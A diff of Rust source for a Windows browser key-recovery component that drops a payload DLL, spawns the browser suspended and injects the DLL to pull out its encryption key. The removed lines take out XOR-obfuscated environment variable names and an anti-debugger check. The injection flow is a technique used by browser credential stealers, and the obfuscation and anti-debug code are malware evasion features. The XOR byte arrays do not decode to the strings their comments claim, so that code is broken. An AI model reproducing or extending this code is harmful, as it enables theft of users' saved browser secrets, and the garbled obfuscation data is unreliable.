@@ -45,50 +45,10 @@ use windows::{
     },
 };
 
-// ============ OBFUSCATION ============
-const XOR_KEY: u8 = 0x5A;
-
-fn xor_decrypt(data: &[u8]) -> String {
-    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
-}
-
-// Obfuscated env var names (generated with Python)
-const ENV_RESULT_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, // "CHROME_RECOVERY_RESULT"
-];
-const ENV_USER_DATA_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, // "CHROME_RECOVERY_USER_DATA_REL"
-];
-const ENV_DATA_ROOT_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, // "CHROME_RECOVERY_DATA_ROOT"
-];
-const ENV_BROWSER_NAME_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, // "CHROME_RECOVERY_BROWSER_NAME"
-];
-
-fn get_env_result() -> String {
-    xor_decrypt(ENV_RESULT_XOR)
-}
-fn get_env_user_data() -> String {
-    xor_decrypt(ENV_USER_DATA_XOR)
-}
-fn get_env_data_root() -> String {
-    xor_decrypt(ENV_DATA_ROOT_XOR)
-}
-fn get_env_browser_name() -> String {
-    xor_decrypt(ENV_BROWSER_NAME_XOR)
-}
-
-// ============ ANTI-DEBUG ============
-fn is_debugged() -> bool {
-    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
-}
-
-// ============ ORIGINAL FUNCTIONS (unchanged except for env var names) ============
+const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
+const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
+const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
+const BROWSER_NAME_ENV: &str = "CHROME_RECOVERY_BROWSER_NAME";
 
 fn wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(Some(0)).collect()
@@ -142,10 +102,10 @@ impl Drop for Cleanup {
         for path in &self.dirs {
             let _ = fs::remove_dir_all(path);
         }
-        let _ = env::remove_var(&get_env_result());
-        let _ = env::remove_var(&get_env_user_data());
-        let _ = env::remove_var(&get_env_data_root());
-        let _ = env::remove_var(&get_env_browser_name());
+        let _ = env::remove_var(RESULT_ENV);
+        let _ = env::remove_var(USER_DATA_ENV);
+        let _ = env::remove_var(DATA_ROOT_ENV);
+        let _ = env::remove_var(BROWSER_NAME_ENV);
     }
 }
 
@@ -508,11 +468,6 @@ fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
 }
 
 pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
-    // Anti-debug
-    if is_debugged() {
-        return None;
-    }
-
     if payload_dll.is_empty() {
         return None;
     }
@@ -534,17 +489,16 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
 
     fs::write(&dll_path, payload_dll).ok()?;
 
-    // Use obfuscated env var names
-    env::set_var(&get_env_result(), &result_path);
-    env::set_var(&get_env_user_data(), target.user_data_rel);
+    env::set_var(RESULT_ENV, &result_path);
+    env::set_var(USER_DATA_ENV, target.user_data_rel);
     env::set_var(
-        &get_env_data_root(),
+        DATA_ROOT_ENV,
         match target.root {
             browsers::DataRoot::Local => "local",
             browsers::DataRoot::Roaming => "roaming",
         },
     );
-    env::set_var(&get_env_browser_name(), browser_name);
+    env::set_var(BROWSER_NAME_ENV, browser_name);
 
     let injected = if let Ok(pid) =
         spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
